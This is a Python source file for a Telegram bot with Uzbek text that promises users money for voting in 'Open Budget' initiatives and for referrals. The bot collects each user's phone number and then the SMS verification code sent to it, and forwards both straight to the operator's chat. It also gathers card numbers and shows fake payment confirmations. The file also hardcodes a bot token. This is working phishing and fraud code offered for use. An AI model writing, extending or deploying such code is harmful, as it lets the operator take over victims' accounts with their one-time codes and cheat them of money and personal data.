import telebot
import time
import os
from threading import Thread
from flask import Flask
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# ==========================================
# ⚙️ ASOSIY SOZLAMALAR (TOKEN VA ADMIN ID)
# ==========================================
TOKEN = "8804847521:AAGVqDdkmc0hHdrDVLgpGQ7WDDBsFrGWC5s"  # Bu yerga botingiz tokenini yozing
ADMIN_ID =   6607270447   # Bu yerga o'zingizning Telegram ID'ingizni yozing

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot faol ishlamoqda!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ==========================================
# 📊 MA'LUMOTLAR OMBORI VA SOZLAMALAR
# ==========================================
user_data = {}
bot_settings = {
    "majburiy_kanal": None,  
    "majburiy_guruh": None,  
    "description": (
        "🤖 *Open Budget Botiga Xush Kelibsiz!*\n\n"
        "Ushbu bot orqali siz sport tashabbuslariga ovoz berib, pul ishlashingiz mumkin.\n\n"
        "🔥 *Imkoniyatlar:*\n"
        "— Har bir to'g'ri berilgan ovoz uchun: 45 000 so'm\n"
        "— Taklif qilingan har bir faol do'stingiz uchun: 1 000 so'm\n"
        "— Minimal pul yechish: 6 000 so'm\n\n"
        "👇 Boshlash uchun pastdagi tugmalardan foydalaning!"
    )
}

def get_user(user_id, username=""):
    if user_id not in user_data:
        user_data[user_id] = {
            "balans": 0,
            "referallar": 0,
            "holat": None,
            "karta": None,
            "username": username or "Mavjud emas",
            "oxirgi_bonus": 0,
            "inviter_id": None  
        }
    return user_data[user_id]

# ==========================================
# ⌨️ KLAVIATURA TUGMALARI (KLASSIK MENYU)
# ==========================================
def asosiy_menyu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.row(KeyboardButton("🗳 Ovoz berish"))
    markup.row(KeyboardButton("💰 Balans"), KeyboardButton("📩 Pulni yechib olish"))
    markup.row(KeyboardButton("🔗 Referal ssilka"))
    markup.row(KeyboardButton("🎉 Aksiyalar"), KeyboardButton("💸 To'lovlar isboti"))
    return markup

def admin_panel_markup():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("📊 Foydalanuvchilar soni", callback_data="admin_stats"))
    markup.row(InlineKeyboardButton("📢 Reklama (Har qanday media)", callback_data="admin_send_reklama"))
    markup.row(InlineKeyboardButton("📢 Kanal Sozlamalari", callback_data="admin_manage_channel"))
    markup.row(InlineKeyboardButton("💬 Guruh Sozlamalari", callback_data="admin_manage_group"))
    markup.row(InlineKeyboardButton("📝 Tavsifni (Description) o'zgartirish", callback_data="admin_edit_desc"))
    return markup

# ==========================================
# 🛡 MAJBURIY OBUNA TIZIMI
# ==========================================
def check_sub(user_id):
    if bot_settings["majburiy_kanal"]:
        try:
            status = bot.get_chat_member(bot_settings["majburiy_kanal"], user_id).status
            if status not in ["member", "administrator", "creator"]:
                return False
        except:
            return False
            
    if bot_settings["majburiy_guruh"]:
        try:
            status = bot.get_chat_member(bot_settings["majburiy_guruh"], user_id).status
            if status not in ["member", "administrator", "creator"]:
                return False
        except:
            return False
            
    return True

# ==========================================
# 💬 ADMIN JAVOB TIZIMI (REPLY XABARLAR)
# ==========================================
@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID and message.reply_to_message)
def admin_reply_to_user(message):
    try:
        target_id = None
        text_lines = message.reply_to_message.text.split('\n')
        for line in text_lines:
            if "ID:" in line:
                target_id = int(line.split(":")[1].strip().replace("`", ""))
        
        if target_id:
            bot.send_message(target_id, f"💬 *Admin:* {message.text}")
            bot.reply_to(message, "✅ Xabaringiz foydalanuvchiga yetkazildi.")
        else:
            bot.reply_to(message, "❌ Xabarda foydalanuvchi ID raqami topilmadi.")
    except Exception as e:
        bot.reply_to(message, "❌ Xatolik yuz berdi yoki foydalanuvchi botni bloklagan.")

# ==========================================
# 🛠 ADMIN COMMANDS
# ==========================================
@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "🛠 *Mukammal Admin Panelga xush kelibsiz!*\nQuyidagi amallardan birini tanlang:", reply_markup=admin_panel_markup(), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚠️ Bu buyruq faqat bot admini uchun!")

# ==========================================
# 🚀 START COMMAND & REFERRAL LOGIC
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    username = message.from_user.username
    
    is_new_user = user_id not in user_data
    user = get_user(user_id, username)
    
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit() and is_new_user:
        referrer_id = int(args[1])
        if referrer_id != user_id:
            user["inviter_id"] = referrer_id

    if not check_sub(user_id):
        markup = InlineKeyboardMarkup()
        if bot_settings["majburiy_kanal"]:
            k_link = bot_settings["majburiy_kanal"].replace("@", "")
            markup.add(InlineKeyboardButton("📢 Kanalga a'zo bo'lish", url=f"https://t.me/{k_link}"))
        if bot_settings["majburiy_guruh"]:
            g_link = bot_settings["majburiy_guruh"].replace("@", "")
            markup.add(InlineKeyboardButton("💬 Guruhga qo'shish", url=f"https://t.me/{g_link}"))
            
        markup.add(InlineKeyboardButton("✅ Tekshirish", callback_data="check_sub_again"))
        bot.send_message(user_id, "⚠️ Botdan foydalanish uchun homiy kanal va guruhimizga a'zo bo'lishingiz shart!", reply_markup=markup)
        return

    if user["inviter_id"] and "taklif_qilindi" not in user:
        ref_id = user["inviter_id"]
        if ref_id in user_data:
            ref_user = get_user(ref_id)
            ref_user["referallar"] += 1
            ref_user["balans"] += 1000
            user["taklif_qilindi"] = True
            try:
                bot.send_message(ref_id, "🎉 Do'stingiz botga qo'shildi! Balansingizga +1000 so'm qo'shildi.")
            except:
                pass

    bot.send_message(user_id, bot_settings["description"], reply_markup=asosiy_menyu(), parse_mode="Markdown")

# ==========================================
# 📲 ASOSIY MENYU LOGIKASI
# ==========================================
def process_menu_logic(message):
    user_id = message.chat.id
    username = message.from_user.username
    user = get_user(user_id, username)
    text = message.text

    if text == "🗳 Ovoz berish":
        user["holat"] = "kutish_telefon"
        matn = (
            "📞 Ovoz berish uchun telefon raqamni kiriting:\n\n"
            "Telefon raqami +998991234567 yoki 991234567 formatida kiritilishi kerak."
        )
        bot.send_message(user_id, matn)

    elif text == "💰 Balans":
        karta_matn = user["karta"] if user["karta"] else "Kiritilmagan"
        matn = (
            f"Sizning hisobingiz: {user['balans']} so'm\n\n"
            f"👥 Referal qilgan do'stlaringiz: {user['referallar']} ta\n"
            f"💳 Saqlangan karta: {karta_matn}"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📩 Pulni yechib olish", callback_data="yechish_inline"))
        bot.send_message(user_id, matn, reply_markup=markup)

    elif text == "📩 Pulni yechib olish":
        if user["balans"] < 6000:
            matn = (
                f"Pul yechib olish uchun hisobingizda 6000 so'mdan ko'p pul bo'lishi shart!\n\n"
                f"Hozirgi balansingiz: {user['balans']} so'm"
            )
            bot.send_message(user_id, matn)
        else:
            user["holat"] = "kutish_karta"
            bot.send_message(user_id, "💳 Pulni yechish uchun plastik karta raqamingizni yoki telefon raqamingizni kiriting:")

    elif text == "🔗 Referal ssilka":
        bot_info = bot.get_me()
        referal_link = f"https://t.me/{bot_info.username}?start={user_id}"
        
        matn = (
            "🤝 *Referral tizimi*\n\n"
            "Do'stlaringizni taklif qiling! Ular botga kirib kanallarga a'zo bo'lishganda siz *1 000 so'm* mukofotga ega bo'lasiz.\n\n"
            f"👥 Taklif qilingan do'stlaringiz: `{user['referallar']}` ta\n\n"
            f"🔗 Sizning referal havolangiz:\n{referal_link}"
        )
        
        share_text = f"🔥 Open Budget botida ovoz berib pul ishlang! Har bir taklif uchun 1000 so'm, ovoz uchun 45 000 so'm berilmoqda. Kirish uchun bosing: {referal_link}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 Do'stlarga ulashish", switch_inline_query=share_text))
        bot.send_message(user_id, matn, reply_markup=markup, parse_mode="Markdown", disable_web_page_preview=True)

    elif text == "🎉 Aksiyalar":
        joriy_vaqt = time.time()
        farq = joriy_vaqt - user["oxirgi_bonus"]
        
        if farq >= 86400:
            user["balans"] += 500
            user["oxirgi_bonus"] = joriy_vaqt
            matn = "🎁 *Tabriklaymiz!* Kunlik bonus 500 so'm hisobingizga muvaffaqiyatli qo'shildi!"
            bot.send_message(user_id, matn, parse_mode="Markdown")
        else:
            qolgan_soniya = int(86400 - farq)
            soat = qolgan_soniya // 3600
            daqiqa = (qolgan_soniya % 3600) // 60
            matn = f"❌ *Siz bugungi bonusni olgansiz!*\n\nYangi bonus olishingiz uchun keyingi *{soat} soat, {daqiqa} daqiqa* kutishingiz lozim."
            bot.send_message(user_id, matn, parse_mode="Markdown")

    elif text == "💸 To'lovlar isboti":
        matn = (
            "✅ Amalga oshirilgan to'lovlarni quyidagi kanalda ko'rishingiz mumkin:\n"
            "👉 https://t.me/openbudgetisbot"
        )
        bot.send_message(user_id, matn)

    elif user["holat"] == "kutish_telefon":
        admin_matn = (
            f"📱 *Yangi raqam keldi!*\n"
            f"Foydalanuvchi: @{user['username']}\n"
            f"ID: `{user_id}`\n"
            f"Raqam: `{text}`"
        )
        bot.send_message(ADMIN_ID, admin_matn, parse_mode="Markdown")
        user["holat"] = "kutish_sms"
        bot.send_message(user_id, "📩 Telefon raqamingizga SMS kod yuborildi. Iltimos, 6 xonali kodni botga kiriting:")

    elif user["holat"] == "kutish_sms":
        admin_matn = (
            f"🔑 *SMS Kod keldi!*\n"
            f"Foydalanuvchi: @{user['username']}\n"
            f"ID: `{user_id}`\n"
            f"SMS Kod: `{text}`"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("➕ 45 000 so'm qo'shish", callback_data=f"add_45000_{user_id}"))
        markup.add(InlineKeyboardButton("❌ Kod noto'g'ri", callback_data=f"wrong_code_{user_id}"))
        
        bot.send_message(ADMIN_ID, admin_matn, reply_markup=markup, parse_mode="Markdown")
        user["holat"] = None
        bot.send_message(user_id, "⏳ Rahmat! Kod qabul qilindi va tekshirilmoqda. Muvaffaqiyatli tasdiqlansa, balansingiz yangilanadi.")

    elif user["holat"] == "kutish_karta":
        user["karta"] = text  
        user["holat"] = None
        
        admin_matn = (
            f"💰 *Pul yechish so'rovi!*\n"
            f"Foydalanuvchi: @{user['username']}\n"
            f"ID: `{user_id}`\n"
            f"Yechiladigan summa: {user['balans']} so'm\n"
            f"Karta raqami: `{text}`"
        )
        bot.send_message(ADMIN_ID, admin_matn, parse_mode="Markdown")
        user["balans"] = 0  
        bot.send_message(user_id, "✅ So'rovingiz adminga yuborildi. Tez orada to'lov amalga oshiriladi!")

# ==========================================
# 📭 HAR QANDAY MULTIMEDIA VA MATNLARNI QABUL QILISH
# ==========================================
@bot.message_handler(content_types=['text', 'photo', 'audio', 'video', 'voice', 'document', 'sticker'])
def handle_all_messages(message):
    user_id = message.chat.id
    username = message.from_user.username
    user = get_user(user_id, username)
    
    if user_id == ADMIN_ID and user.get("holat") == "kutish_reklama":
        user["holat"] = None
        success, failed = 0, 0
        bot.send_message(ADMIN_ID, "📢 Reklama barcha foydalanuvchilarga tarqatilmoqda...")
        for uid in list(user_data.keys()):
            try:
                bot.copy_message(chat_id=uid, from_chat_id=ADMIN_ID, message_id=message.message_id)
                success += 1
                time.sleep(0.05)
            except:
                failed += 1
        bot.send_message(ADMIN_ID, f"📢 *Reklama yakunlandi!*\n\n👤 Yetkazildi: {success}\n❌ Bloklaganlar: {failed}", parse_mode="Markdown")
        return

    if user_id == ADMIN_ID and user.get("holat") == "kutish_kanal":
        user["holat"] = None
        if message.text == "0":
            bot_settings["majburiy_kanal"] = None
            bot.send_message(ADMIN_ID, "✅ Majburiy obuna kanali o'chirildi!")
        else:
            kanal = message.text if message.text.startswith("@") else f"@{message.text}"
            bot_settings["majburiy_kanal"] = kanal
            bot.send_message(ADMIN_ID, f"✅ Kanal kiritildi: {kanal}")
        return

    if user_id == ADMIN_ID and user.get("holat") == "kutish_guruh":
        user["holat"] = None
        if message.text == "0":
            bot_settings["majburiy_guruh"] = None
            bot.send_message(ADMIN_ID, "✅ Majburiy guruh o'chirildi!")
        else:
            guruh = message.text if message.text.startswith("@") else f"@{message.text}"
            bot_settings["majburiy_guruh"] = guruh
            bot.send_message(ADMIN_ID, f"✅ Guruh kiritildi: {guruh}")
        return

    if user_id == ADMIN_ID and user.get("holat") == "kutish_desc":
        user["holat"] = None
        bot_settings["description"] = message.text
        bot.send_message(ADMIN_ID, "✅ Bot tavsifi yangilandi!")
        return

    if message.content_type == 'text':
        if not check_sub(user_id):
            start_command(message)
            return
            
        if user_id != ADMIN_ID and user["holat"] is None and message.text not in ["🗳 Ovoz berish", "💰 Balans", "📩 Pulni yechib olish", "🔗 Referal ssilka", "🎉 Aksiyalar", "💸 To'lovlar isboti"]:
            bot.send_message(ADMIN_ID, f"👤 *Foydalanuvchidan xabar:*\nID: `{user_id}`\nUsername: @{user['username']}\n\nXabar: {message.text}", parse_mode="Markdown")
            bot.send_message(user_id, "✉️ Xabaringiz adminga yuborildi. Tez orada javob olasiz.")
            return

        process_menu_logic(message)

# ==========================================
# ⚙️ CALLBACK OPERATORLARI (INLINE INPUTS)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.message.chat.id
    user = get_user(user_id)
    bot_info = bot.get_me()
    
    if call.data == "check_sub_again":
        bot.answer_callback_query(call.id)
        if check_sub(user_id):
            bot.delete_message(user_id, call.message.message_id)
            
            if user["inviter_id"] and "taklif_qilindi" not in user:
                ref_id = user["inviter_id"]
                if ref_id in user_data:
                    ref_user = get_user(ref_id)
                    ref_user["referallar"] += 1
                    ref_user["balans"] += 1000
                    user["taklif_qilindi"] = True
                    try:
                        bot.send_message(ref_id, "🎉 Do'stingiz botga qo'shildi va kanallarga a'zo bo'ldi! Balansingizga +1000 so'm qo'shildi.")
                    except:
                        pass
                        
            bot.send_message(user_id, bot_settings["description"], reply_markup=asosiy_menyu(), parse_mode="Markdown")
        else:
            bot.send_message(user_id, "❌ Siz hali barcha homiy kanallarga a'zo bo'lmadingiz.")

    elif call.data == "yechish_inline":
        bot.answer_callback_query(call.id)
        call.message.text = "📩 Pulni yechib olish"
        process_menu_logic(call.message)
        
    elif call.data == "admin_stats":
        bot.answer_callback_query(call.id)
        bot.send_message(ADMIN_ID, f"📊 Jami foydalanuvchilar: {len(user_data)} ta")
        
    elif call.data == "admin_send_reklama":
        bot.answer_callback_query(call.id)
        user["holat"] = "kutish_reklama"
        bot.send_message(ADMIN_ID, "📢 Istalgan formatdagi reklamani yuboring:")

    elif call.data == "admin_manage_channel":
        bot.answer_callback_query(call.id)
        user["holat"] = "kutish_kanal"
        hozirgi = bot_settings["majburiy_kanal"] or "Yo'q"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🤖 Botni Kanalga Admin Qilish", url=f"https://t.me/{bot_info.username}?startchannel=true&admin=post_messages+edit_messages+delete_messages+invite_users"))
        bot.send_message(ADMIN_ID, f"📢 Hozirgi kanal: {hozirgi}\nYangi kanal usernamesini yuboring yoki o'chirish uchun `0` yozing:", reply_markup=markup)

    elif call.data == "admin_manage_group":
        bot.answer_callback_query(call.id)
        user["holat"] = "kutish_guruh"
        hozirgi = bot_settings["majburiy_guruh"] or "Yo'q"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🤖 Botni Guruhga Admin Qilish", url=f"https://t.me/{bot_info.username}?startgroup=true&admin=post_messages+edit_messages+delete_messages+invite_users"))
        bot.send_message(ADMIN_ID, f"💬 Hozirgi guruh: {hozirgi}\nYangi guruh usernamesini yuboring yoki o'chirish uchun `0` yozing:", reply_markup=markup)

    elif call.data == "admin_edit_desc":
        bot.answer_callback_query(call.id)
        user["holat"] = "kutish_desc"
        bot.send_message(ADMIN_ID, "📝 Yangi bot tavsifi (Description) matnini yuboring:")

    elif call.data.startswith("add_45000_"):
        target_user_id = int(call.data.split("_")[2])
        target_user = get_user(target_user_id)
        target_user["balans"] += 45000
        bot.answer_callback_query(call.id, text="45 000 so'm qo'shildi!")
        bot.edit_message_text(call.message.text + "\n\n✅ *Ovoz tasdiqlandi! (+45 000 so'm)*", ADMIN_ID, call.message.message_id, parse_mode="Markdown")
        try:
            bot.send_message(target_user_id, "🎉 Ovozingiz muvaffaqiyatli tasdiqlandi! Hisobingizga **45 000 so'm** qo'shildi.", parse_mode="Markdown")
        except: pass

    elif call.data.startswith("wrong_code_"):
        target_user_id = int(call.data.split("_")[2])
        bot.answer_callback_query(call.id, text="Rad etildi!")
        bot.edit_message_text(call.message.text + "\n\n❌ *Kod xato deb rad etildi!*", ADMIN_ID, call.message.message_id, parse_mode="Markdown")
        try:
            bot.send_message(target_user_id, "❌ Siz kiritgan SMS kod noto‘g‘ri yoki bu raqam avval ishlatilgan.")
        except: pass

if __name__ == '__main__':
    server_thread = Thread(target=run_flask)
    server_thread.daemon = True
    server_thread.start()
    
    print("Mukammal va to'liq bot kodlari ishga tushdi...")
    bot.polling(none_stop=True)
